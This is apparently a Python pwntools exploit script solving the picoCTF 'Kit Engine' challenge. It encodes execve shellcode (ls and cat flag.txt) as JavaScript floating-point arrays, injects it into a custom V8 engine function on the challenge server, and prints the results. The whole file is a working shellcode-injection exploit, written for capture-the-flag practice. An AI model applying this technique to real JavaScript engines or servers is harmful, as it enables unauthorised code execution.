import os
from pwn import *

###################setup file and elf files####################
level = "Kit Engine"
ip = "mercury.picoctf.net:51835"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

context.arch = 'amd64'
######################start process##########################

# no way to simulalate locally other than to send the shellcode to the server.py script

#####################functions to convert shell code to js array of double###################### 

#sc2dbls is a function to convert the shellcode to a generator of doubles
def sc2dbls(sc):
    for i in range(0, len(sc), 8):
        blk = sc[i : i + 8]
        if len(blk) < 8:
            blk = blk + b"\0" * (8 - len(blk))        # \0s are appended in he last because of little endian
        yield str(struct.unpack("<d", blk)[0])          #< is used because of little endian

#sc2js is a function to convert the shellcode to js array of double
def sc2js(sc):
    items = ", ".join(sc2dbls(sc))
    assert not "nan" in items
    code = f"AssembleEngine([{items}])"
    return code


def run_js_remote(code):
    r = remote(ip.split(':')[0], ip.split(':')[1])
    r.sendlineafter(b"Provide size", str(len(code)))
    r.sendlineafter(b"Provide script", code)
    return r.recvall().decode()

#shellcraft to get the assembly code in form of a string
#asm will convert in form of shellcode
ls = sc2js(asm(shellcraft.execve(b"/bin/ls", ["ls"])))
catflag = sc2js(asm(shellcraft.execve(b"/bin/cat", ["cat", "flag.txt"])))

log.info(run_js_remote(ls))
log.info(run_js_remote(catflag))

#for ls cmd we get this AssembleEngine argument
#   AssembleEngine([7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316])
#for cat flag.txt cmd we get this AssembleEngine argument
#   AssembleEngine([8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316])